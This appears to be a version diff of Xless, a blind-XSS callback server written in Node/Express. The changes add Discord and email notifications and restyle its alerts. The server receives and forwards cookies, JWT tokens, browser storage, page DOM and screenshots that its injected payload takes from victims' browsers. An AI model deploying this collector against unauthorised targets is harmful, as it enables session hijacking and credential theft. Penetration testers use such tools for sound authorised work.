@@ -1,5 +1,5 @@
 // Xless: The Serverlesss Blind XSS App.
-// Version: v1.2
+// Version: v1.3
 // Author: Mazin Ahmed <mazin@mazinahmed.net>
 
 const express = require("express");
@@ -8,13 +8,25 @@ var cors = require("cors");
 const process = require("process");
 var request = require("request");
 const path = require("path");
+const nodemailer = require("nodemailer");
 
 // Support local development with .env
 require("dotenv").config();
 
 const port = process.env.PORT || 3000;
 const imgbb_api_key = process.env.IMGBB_API_KEY;
+const discord_webhook_url = process.env.DISCORD_WEBHOOK_URL;
 const slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK;
+
+// Email Configuration
+const email_config = {
+  host: process.env.EMAIL_HOST,
+  port: process.env.EMAIL_PORT,
+  user: process.env.EMAIL_USER,
+  pass: process.env.EMAIL_PASS,
+  from: process.env.EMAIL_FROM,
+  to: process.env.EMAIL_TO
+};
 
 const app = express();
 app.use(cors());
@@ -32,35 +44,80 @@ app.use(function (req, res, next) {
 });
 
 function generate_blind_xss_alert(body) {
-  var alert = "*XSSless: Blind XSS Alert*\n";
+  var alert = "🚨 **XSSless: Blind XSS Alert** 🚨\n";
+  alert += "═══════════════════════════════════\n\n";
+
+  // Priority fields first
+  const priorityFields = ['Location', 'Document Domain', 'Document Location', 'Remote IP', 'Cookies', 'JWT Tokens'];
+  const processedFields = new Set();
+
+  // Add priority fields first
+  priorityFields.forEach(field => {
+    if (body[field] !== undefined && !processedFields.has(field)) {
+      processedFields.add(field);
+      if (field === 'Screenshot' || field === 'Screenshot URL') return;
+
+      let emoji = '📍';
+      if (field === 'Cookies') emoji = '🍪';
+      if (field === 'JWT Tokens') emoji = '🔑';
+      if (field === 'Remote IP') emoji = '🌐';
+      if (field === 'Document Domain' || field === 'Document Location') emoji = '📄';
+
+      if (body[field] === "") {
+        alert += `${emoji} **${field}:** \`None\`\n\n`;
+      } else {
+        let value = body[field];
+        // Truncate very long values for readability
+        if (field === 'DOM' && value.length > 500) {
+          value = value.substring(0, 500) + '... [truncated]';
+        }
+        alert += `${emoji} **${field}:**\n\`\`\`\n${value}\n\`\`\`\n`;
+      }
+    }
+  });
+
+  // Add remaining fields
   for (let k of Object.keys(body)) {
-    if (k === "Screenshot") {
-      continue;
-    }
-    if (k === "DOM") {
-      body[k] = `\n\nhello ${body[k]}\n\n`;
-    }
+    if (processedFields.has(k) || k === 'Screenshot' || k === 'Screenshot URL') continue;
+    processedFields.add(k);
+
+    let emoji = '•';
+    if (k === 'User-Agent') emoji = '💻';
+    if (k === 'Referrer') emoji = '↩️';
+    if (k === 'Origin') emoji = '🏠';
+    if (k === 'Browser Time') emoji = '🕐';
+    if (k === 'localStorage' || k === 'sessionStorage') emoji = '💾';
 
     if (body[k] === "") {
-      alert += "*" + k + ":* " + "```None```" + "\n";
+      alert += `${emoji} **${k}:** \`None\`\n\n`;
     } else {
-      alert += "*" + k + ":* " + "\n```" + body[k] + "```" + "\n";
+      let value = body[k];
+      if (k === 'DOM' && value.length > 500) {
+        value = value.substring(0, 500) + '... [truncated]';
+      }
+      alert += `${emoji} **${k}:**\n\`\`\`\n${value}\n\`\`\`\n`;
     }
   }
+
   return alert;
 }
 
 function generate_callback_alert(headers, data, url) {
-  var alert = "*XSSless: Out-of-Band Callback Alert*\n";
-  alert += `• *IP Address:* \`${data["Remote IP"]}\`\n`;
-  alert += `• *Request URI:* \`${url}\`\n`;
+  var alert = "📡 **XSSless: Out-of-Band Callback Alert** 📡\n";
+  alert += "═══════════════════════════════════\n\n";
+  alert += `🌐 **Remote IP:** \`${data["Remote IP"]}\`\n`;
+  alert += `📍 **Request URI:** \`${url}\`\n`;
+  alert += `💻 **User-Agent:** \`${headers["user-agent"] || "Unknown"}\`\n`;
+  alert += `🏠 **Host:** \`${headers["host"] || "Unknown"}\`\n\n`;
 
-  // Add all the headers
+  alert += "📋 **All Headers:**\n\`\`\`\n";
   for (var key in headers) {
     if (headers.hasOwnProperty(key)) {
-      alert += `• *${key}:* \`${headers[key]}\`\n`;
+      alert += `${key}: ${headers[key]}\n`;
     }
   }
+  alert += "\`\`\`\n";
+  alert += "\n⏳ *Waiting for payload data collection...*\n";
   return alert;
 }
 
@@ -96,6 +153,262 @@ async function uploadImage(image) {
   });
 }
 
+const splitMessage = (str, maxLength = 2000) => {
+  const chunks = [];
+  let currentChunk = "";
+
+  const lines = str.split("\n");
+  for (const line of lines) {
+    if ((currentChunk + line + "\n").length > maxLength) {
+      chunks.push(currentChunk);
+      currentChunk = "";
+    }
+
+    // If a single line is too long (e.g. huge DOM blob), we must split it hard
+    if (line.length > maxLength) {
+      if (currentChunk.length > 0) {
+        chunks.push(currentChunk);
+        currentChunk = "";
+      }
+      let remainingLine = line;
+      while (remainingLine.length > 0) {
+        let amount = maxLength;
+        // Try not to split code blocks awkwardly if possible, but hard split is necessary for huge lines
+        chunks.push(remainingLine.slice(0, amount));
+        remainingLine = remainingLine.slice(amount);
+      }
+    } else {
+      currentChunk += line + "\n";
+    }
+  }
+  if (currentChunk.length > 0) {
+    chunks.push(currentChunk);
+  }
+  return chunks;
+};
+
+// Promisified helper to send Discord alerts
+function sendDiscordAlert(message, screenshotUrl) {
+  return new Promise((resolve, reject) => {
+    if (!discord_webhook_url) {
+      return resolve("skipped");
+    }
+
+    const chunks = splitMessage(message, 1900);
+
+    let failed = false;
+    let completed = 0;
+    const totalSteps = screenshotUrl && screenshotUrl !== "NA" && screenshotUrl !== ""
+      ? chunks.length + 1  // +1 for separate screenshot message
+      : chunks.length;
+
+    const checkDone = () => {
+      completed++;
+      if (completed >= totalSteps) {
+        if (failed) reject(new Error("Failed to send some Discord messages"));
+        else resolve("sent");
+      }
+    };
+
+    const sendScreenshot = () => {
+      if (!screenshotUrl || screenshotUrl === "NA" || screenshotUrl === "") return;
+
+      // Send screenshot as a SEPARATE message so it reliably renders
+      let screenshotPayload = {
+        username: "Xless Security Alert",
+        content: "📸 **Screenshot:**",
+        embeds: [{
+          color: 0xff0000,
+          image: {
+            url: screenshotUrl
+          },
+          footer: {
+            text: "Xless Blind XSS Detection"
+          },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      request.post(discord_webhook_url, { json: screenshotPayload }, (err, res, body) => {
+        if (err || (res && res.statusCode >= 400)) {
+          console.error("Error sending screenshot to Discord:", err || `Status: ${res.statusCode}`, body);
+          failed = true;
+        } else {
+          console.log("Discord screenshot message sent successfully");
+        }
+        checkDone();
+      });
+    };
+
+    const sendChunk = (index) => {
+      if (index >= chunks.length) {
+        // All text chunks sent, now send screenshot separately
+        setTimeout(sendScreenshot, 500);
+        return;
+      }
+
+      let payload = {
+        username: "Xless Security Alert",
+        content: chunks[index]
+      };
+
+      request.post(discord_webhook_url, { json: payload }, (err, res, body) => {
+        if (err || (res && res.statusCode >= 400)) {
+          console.error("Error sending to Discord:", err || `Status: ${res.statusCode}`);
+          failed = true;
+        }
+        checkDone();
+        setTimeout(() => sendChunk(index + 1), 500);
+      });
+    };
+
+    sendChunk(0);
+  });
+}
+
+// Promisified helper to send Slack alerts
+function sendSlackAlert(message, screenshotUrl) {
+  return new Promise((resolve, reject) => {
+    if (!slack_incoming_webhook) {
+      return resolve("skipped");
+    }
+
+    let blocks = [
+      {
+        type: "header",
+        text: {
+          type: "plain_text",
+          text: "🚨 Blind XSS Alert Triggered",
+          emoji: true
+        }
+      },
+      {
+        type: "section",
+        text: {
+          type: "mrkdwn",
+          text: message
+        }
+      }
+    ];
+
+    // Add screenshot if available
+    if (screenshotUrl && screenshotUrl !== "NA" && screenshotUrl !== "") {
+      blocks.push({
+        type: "image",
+        title: {
+          type: "plain_text",
+          text: "📸 Screenshot Captured",
+          emoji: true
+        },
+        image_url: screenshotUrl,
+        alt_text: "XSS Screenshot"
+      });
+    }
+
+    let payload = {
+      username: "Xless Security Alert",
+      icon_emoji: ":rotating_light:",
+      blocks: blocks
+    };
+
+    let data = {
+      form: {
+        payload: JSON.stringify(payload)
+      }
+    };
+
+    request.post(slack_incoming_webhook, data, (err, res, body) => {
+      if (err || (res && res.statusCode >= 400)) {
+        console.error("Error sending to Slack:", err || `Status: ${res.statusCode}`);
+        reject(err || new Error(`Slack API Status: ${res.statusCode}`));
+      } else {
+        resolve("sent");
+      }
+    });
+  });
+}
+
+// Function to send Email Alert (now primary, not fallback)
+async function sendEmailAlert(subject, text, screenshotUrl) {
+  if (!email_config.host || !email_config.user || !email_config.pass || !email_config.to) {
+    console.log("Email not configured, skipping.");
+    return;
+  }
+
+  let transporter = nodemailer.createTransport({
+    host: email_config.host,
+    port: email_config.port || 587,
+    secure: false,
+    auth: {
+      user: email_config.user,
+      pass: email_config.pass
+    }
+  });
+
+  // Build HTML email for better formatting
+  let plainText = text.replace(/\*\*/g, '').replace(/```/g, '').replace(/\`/g, '');
+  let htmlBody = '<div style="font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; border-radius: 10px;">';
+  htmlBody += '<h2 style="color: #ff4444;">🚨 ' + subject + '</h2>';
+  htmlBody += '<hr style="border-color: #333;">';
+  htmlBody += '<pre style="white-space: pre-wrap; word-wrap: break-word; font-size: 13px;">' + plainText + '</pre>';
+
+  if (screenshotUrl && screenshotUrl !== 'NA' && screenshotUrl !== '') {
+    htmlBody += '<hr style="border-color: #333;">';
+    htmlBody += '<h3 style="color: #ff6644;">📸 Screenshot</h3>';
+    htmlBody += '<a href="' + screenshotUrl + '"><img src="' + screenshotUrl + '" style="max-width: 100%; border-radius: 8px; border: 2px solid #ff4444;" /></a>';
+  }
+  htmlBody += '<br><p style="color: #888; font-size: 11px;">— Xless Blind XSS Detection</p>';
+  htmlBody += '</div>';
+
+  let mailOptions = {
+    from: email_config.from || email_config.user,
+    to: email_config.to,
+    subject: '🚨 ' + subject,
+    text: plainText + (screenshotUrl ? '\n\nScreenshot URL: ' + screenshotUrl : ''),
+    html: htmlBody
+  };
+
+  try {
+    let info = await transporter.sendMail(mailOptions);
+    console.log("Email sent: %s", info.messageId);
+  } catch (error) {
+    console.error("Error sending email:", error);
+  }
+}
+
+// Helper to orchestrate notifications - sends to ALL configured channels
+async function sendNotifications(message, screenshotUrl, subject = "Xless Alert") {
+  const promises = [];
+
+  // Send to Discord if configured
+  if (discord_webhook_url) {
+    promises.push(sendDiscordAlert(message, screenshotUrl));
+  }
+
+  // Send to Slack if configured
+  if (slack_incoming_webhook) {
+    promises.push(sendSlackAlert(message, screenshotUrl));
+  }
+
+  // Send email ALWAYS if configured (not just as fallback)
+  if (email_config.host && email_config.user && email_config.pass && email_config.to) {
+    promises.push(sendEmailAlert(subject, message, screenshotUrl));
+  }
+
+  if (promises.length === 0) {
+    console.log("WARNING: No notification channels configured!");
+    return;
+  }
+
+  const results = await Promise.allSettled(promises);
+  results.forEach((result, i) => {
+    if (result.status === 'rejected') {
+      console.error(`Notification channel ${i} failed:`, result.reason);
+    }
+  });
+}
+
+
 app.get("/examples", (req, res) => {
   res.header("Content-Type", "text/plain");
   //var url = req.protocol + '://' + req.headers['host']
@@ -111,25 +424,22 @@ app.get("/examples", (req, res) => {
   res.end();
 });
 
-app.all("/message", (req, res) => {
+app.all("/message", async (req, res) => {
   var message = req.query.text || req.body.text;
   const alert = generate_message_alert(message);
-  data = {
-    form: {
-      payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
-    },
-  };
+  var domain = req.headers["host"] || "Unknown";
 
-  request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out) => {
-    res.send("ok\n");
-    res.end();
-  });
+  // Send Notifications
+  await sendNotifications(alert, null, "XLess Message Alert — " + domain);
+
+  res.send("ok\n");
+  res.end();
 });
 
 app.post("/c", async (req, res) => {
   let data = req.body;
 
-  // Upload our screenshot and only then send the Slack alert
+  // Upload our screenshot and only then send the Slack/Discord alert
   data["Screenshot URL"] = "";
 
   if (imgbb_api_key && data["Screenshot"]) {
@@ -143,29 +453,32 @@ app.post("/c", async (req, res) => {
       const imgOut = JSON.parse(imgRes);
       if (imgOut.error) {
         data["Screenshot URL"] = "NA";
-      } else if (imgOut.data && imgOut.data.url_viewer) {
-        // Add the URL to our data array so it will be included on our Slack message
-        data["Screenshot URL"] = imgOut.data.url_viewer;
+        console.error("ImgBB error:", imgOut.error);
+      } else if (imgOut.data && imgOut.data.url) {
+        // Use direct image URL (not url_viewer) so it embeds in Discord/Slack
+        data["Screenshot URL"] = imgOut.data.url;
+        console.log("Screenshot uploaded:", imgOut.data.url);
       }
     } catch (e) {
       data["Screenshot URL"] = e.message;
     }
   }
 
-  // Now handle the regular Slack alert
+  // Now handle the regular alerts
   data["Remote IP"] =
     req.headers["x-forwarded-for"] || req.connection.remoteAddress;
   const alert = generate_blind_xss_alert(data);
-  data = {
-    form: {
-      payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
-    },
-  };
 
-  request.post(slack_incoming_webhook, data, (out) => {
-    res.send("ok\n");
-    res.end();
-  });
+  // Extract domain for email subject
+  var domain = data["Document Domain"] || data["Document Location"] || data["Location"] || "Unknown";
+  // If it's a full URL, extract just the hostname
+  try { domain = new URL(domain).hostname || domain; } catch (e) { /* keep as-is */ }
+
+  // Send Notifications
+  await sendNotifications(alert, data["Screenshot URL"], "XLess Blind XSS Alert — " + domain);
+
+  res.send("ok\n");
+  res.end();
 });
 
 /**
@@ -177,10 +490,11 @@ app.get("/health", async (req, res) => {
   // Check if the environemtn variables are set
   health_data.IMGBB_API_KEY = imgbb_api_key !== undefined;
   health_data.SLACK_INCOMING_WEBHOOK = slack_incoming_webhook !== undefined;
+  health_data.DISCORD_WEBHOOK_URL = discord_webhook_url !== undefined;
+  health_data.EMAIL_FALLBACK = (email_config.host && email_config.user && email_config.pass && email_config.to) ? true : false;
 
-  if (!health_data.IMGBB_API_KEY || !health_data.SLACK_INCOMING_WEBHOOK) {
-    res.json(health_data);
-    res.end();
+  if (!health_data.IMGBB_API_KEY || (!health_data.SLACK_INCOMING_WEBHOOK && !health_data.DISCORD_WEBHOOK_URL && !health_data.EMAIL_FALLBACK)) {
+    // Warning if no notification channels
   }
 
   const xless_logo =
@@ -203,24 +517,27 @@ app.get("/health", async (req, res) => {
   res.end();
 });
 
-app.all("/*", (req, res) => {
+app.all("/*", async (req, res) => {
   var headers = req.headers;
   var data = req.body;
   data["Remote IP"] =
     req.headers["x-forwarded-for"] || req.connection.remoteAddress;
   const alert = generate_callback_alert(headers, data, req.url);
-  data = {
-    form: {
-      payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
-    },
-  };
+  var domain = req.headers["host"] || "Unknown";
 
-  request.post(slack_incoming_webhook, data, (out) => {
-    res.sendFile(path.join(__dirname + "/payload.js"));
+  // Send Notifications
+  await sendNotifications(alert, null, "XLess Callback Alert — " + domain);
+
+  res.sendFile(path.join(__dirname + "/payload.js"));
+});
+
+// Export the app for serverless (Netlify/Vercel)
+module.exports = app;
+
+// Only start server if not in serverless environment
+if (require.main === module) {
+  app.listen(port, (err) => {
+    if (err) throw err;
+    console.log(`> Ready On Server http://localhost:${port}`);
   });
-});
-
-app.listen(port, (err) => {
-  if (err) throw err;
-  console.log(`> Ready On Server http://localhost:${port}`);
-});
+}
